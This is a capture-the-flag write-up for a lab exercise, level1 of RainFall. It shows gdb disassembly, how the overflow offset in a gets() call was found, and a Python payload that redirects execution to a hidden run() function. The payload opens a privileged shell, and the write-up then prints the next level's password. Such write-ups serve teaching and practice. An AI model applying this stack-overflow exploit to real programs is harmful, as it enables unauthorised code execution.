# Level1

Using gdb:

	(gdb) disas main
	Dump of assembler code for function main:
	   0x08048480 <+0>:	push   %ebp
	   0x08048481 <+1>:	mov    %esp,%ebp
	   0x08048483 <+3>:	and    $0xfffffff0,%esp
	   0x08048486 <+6>:	sub    $0x50,%esp
	   0x08048489 <+9>:	lea    0x10(%esp),%eax
	   0x0804848d <+13>:	mov    %eax,(%esp)
	   0x08048490 <+16>:	call   0x8048340 <gets@plt>
	   0x08048495 <+21>:	leave  
	   0x08048496 <+22>:	ret    
	End of assembler dump.

We can also find a function in the source code which is never used :

	(gdb) disas run
	Dump of assembler code for function run:
	   0x08048444 <+0>:	push   %ebp
	   0x08048445 <+1>:	mov    %esp,%ebp
	   0x08048447 <+3>:	sub    $0x18,%esp
	   0x0804844a <+6>:	mov    0x80497c0,%eax
	   0x0804844f <+11>:	mov    %eax,%edx
	   0x08048451 <+13>:	mov    $0x8048570,%eax
	   0x08048456 <+18>:	mov    %edx,0xc(%esp)
	   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
	   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
	   0x0804846a <+38>:	mov    %eax,(%esp)
	   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
	   0x08048472 <+46>:	movl   $0x8048584,(%esp)
	   0x08048479 <+53>:	call   0x8048360 <system@plt>
	   0x0804847e <+58>:	leave  
	   0x0804847f <+59>:	ret    
	End of assembler dump.

This run() function is able to start a shell. The goal is to call this function within the main.
The gets function in the main is prone to buffer overflow attacks. Since we know the buffer size, we can start to craft a payload that will overwrite the EIP register (instruction pointer), to pass it the address of run. We can see its address is 0x08048444.

                        +---------------+ Highest Address 0xffffffff
                        | cmd line args |
                        | env Variable  |
                        +---------------+
                        |     STACK     |
                        +--+------------+
                        |  |            |
                        |  |            |
                        |  v         ^  |
                        |            |  |
                        |            |  |
                        +------------+--+
                        |     HEAP      |
                        +---------------+
                        | Uninitialized |
                        |   Data(BSS)   |
                        +---------------+
                        |  Initialized  |
                        |     Data      |
                        +---------------+
                        |   Read Only   |
                        |     data      |
                        |       +       |
                        |     code      |
                        +---------------+ Lowest Address 0X00000000



                       +   Previous function  +
                       |     Stack frame      +
                       |                      |
                       +----------------------+ <--+ previous function stack frame end here
                       |Space for return value|
                       +----------------------+
                       |Arguments for function|
                       +----------------------+
                       |    return address    |
                       +----------------------+
                       |     saved $ebp       |
                       +----------------------+
	               |         $eip         |
	               +----------------------+
                       |                      | <--+  padding done by compilers
                       +------------+---------+
                       |         |4 |         |
                       |         |3 |         |
                       |         |2 | ^       |
                       |         |1 | |       |
                       |      ch |0 | |       |
                       +------------+-+-------+
                       |                      |
                       |     unused space     |
                       +                      +

[source](https://github.com/rosehgal/BinExp/tree/master)

Let's first check the maximum size of the buffer: 

	$ python -c 'print("A"*70 + "BCDEFGHIJK")' > payload

Looking at the registers, we see :

	(gdb) r < payload
	Starting program: /home/user/level1/level1 < payload

	Program received signal SIGSEGV, Segmentation fault.
	0x4b4a4948 in ?? ()
	(gdb) info registers
	[...]
	esp            0xbffff740	0xbffff740
	ebp            0x47464544	0x47464544
	esi            0x0	0
	edi            0x0	0
	eip            0x4b4a4948	0x4b4a4948
	[...]

The value of EBP is 0x47464544, corresponding to the following ascii characters : G(47), F(46), E(45), D(44). 
The value of EIP is 0x4b4a4948, corresponding to the following ascii characters : H(48), I(49), J(4a), K(4b)
It makes sense since EIP typically follows EBP in the stack.
It means we can overwrite the EIP register using the 77-80th characters.
If we pass the address of the run function to EIP, it will be executed as the next instruction.

	python -c 'print "A"*76+"\x44\x84\x04\x08"' > payload // address in little endian order

By passing this payload as argument, the binary will start a shell. We also need to keep stdin open using 'cat -'.

	level1@RainFall:~$ cat payload - | ./level1 
	Good... Wait what?
	id
	uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
	cd ../level2
	cat .pass
	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

